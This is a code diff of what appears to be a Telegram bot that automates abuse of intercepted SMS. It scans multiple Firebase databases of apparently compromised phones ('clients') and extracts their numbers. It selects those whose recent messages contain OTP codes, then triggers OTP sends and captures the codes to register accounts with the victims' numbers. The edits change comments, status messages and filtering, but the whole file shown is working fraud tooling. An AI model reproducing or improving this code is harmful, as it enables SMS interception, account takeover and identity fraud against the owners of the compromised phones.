@@ -193,13 +193,13 @@ def extract_phone(messages_dict):
 def has_active_otp_pattern(messages_dict):
     """
     Analyzes unpinned recent 5 messages for active OTP patterns.
-    Ensures message timestamps or interval structure points to active human usage.
+    Skips top 2 pinned/sticky messages and checks if recent messages contain 6-digit OTPs.
     """
     if not isinstance(messages_dict, dict):
         return False
     
     msg_items = list(messages_dict.items())
-    # Skip top 2 pinned/sticky messages, evaluate the recent 5 unpinned messages
+    # Skip top 2 pinned/sticky messages, evaluate the recent unpinned messages
     unpinned_items = msg_items[2:] if len(msg_items) > 2 else msg_items
     
     valid_otp_count = 0
@@ -588,7 +588,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scanning initiated!</b> Filtering unregistered active devices across all DBs...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Vetting unregistered active devices for strict OTP patterns...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -596,7 +596,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         total_needed = 3
         success_count = 0
         registered_numbers = []
-        skipped_phones = set()  # Permanently blacklists numbers that timeout or fail
+        skipped_phones = set()  # Permanently blacklists numbers that timeout, fail, or lack OTP patterns
         used_phones = set()
         logger = LiveLogger(status_msg)
 
@@ -604,14 +604,14 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                # --- PHASE 1: FULL BULK SCAN OF ALL DATABASES ---
+                # --- FULL BULK SCAN ACROSS ALL DATABASES SIMULTANEOUSLY ---
                 all_unregistered_candidates = []
                 
                 async with aiohttp.ClientSession() as session:
                     for fb_url in firebase_dbs:
                         db_short_id = fb_url.split('//')[1].split('.')[0][:8]
                         try:
-                            # Fetch all clients in bulk from this database
+                            # Fetch clients list in bulk
                             async with session.get(f"{fb_url}clients.json", timeout=8) as r:
                                 clients_data = await r.json() or {}
 
@@ -619,7 +619,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            # Fetch message history in bulk to evaluate unpinned recent 5 messages
+                                            # Fetch message history in bulk to inspect recent 7 messages (ignoring top 2 pinned)
                                             async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=5) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
@@ -627,26 +627,28 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # Vibrate/Check if recent unpinned messages have active OTP patterns
+                                                        # STRICT PATTERN CHECK: Must have active OTP patterns in recent unpinned messages
                                                         if has_active_otp_pattern(msgs):
                                                             all_unregistered_candidates.append({
                                                                 "firebase_url": fb_url,
                                                                 "db_short_id": db_short_id,
                                                                 "cid": cid,
-                                                                "phone": full_phone,
-                                                                "msgs": msgs
+                                                                "phone": full_phone
                                                             })
+                                                        else:
+                                                            # Ignore numbers lacking active OTP pattern immediately
+                                                            skipped_phones.add(full_phone)
                                         except Exception:
                                             pass
                         except Exception:
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with valid OTP history found. Retrying in 5s...")
+                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with valid OTP pattern found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
-                # Pick the highest-priority active unregistered candidate from our bulk scan list
+                # Pick the top active candidate from our bulk scan list
                 target = all_unregistered_candidates[0]
                 firebase_url = target["firebase_url"]
                 db_short_id = target["db_short_id"]
@@ -670,7 +672,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 send_status = await client.send_otp()
 
                 if send_status != "SUCCESS":
-                    skipped_phones.add(phone)  # Skip bad number permanently
+                    skipped_phones.add(phone)
                     await client.close()
                     continue
 
@@ -698,7 +700,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                         pass
 
                 if not otp_found:
-                    skipped_phones.add(phone)  # Skip timed-out number permanently
+                    skipped_phones.add(phone)
                     await client.close()
                     continue
 
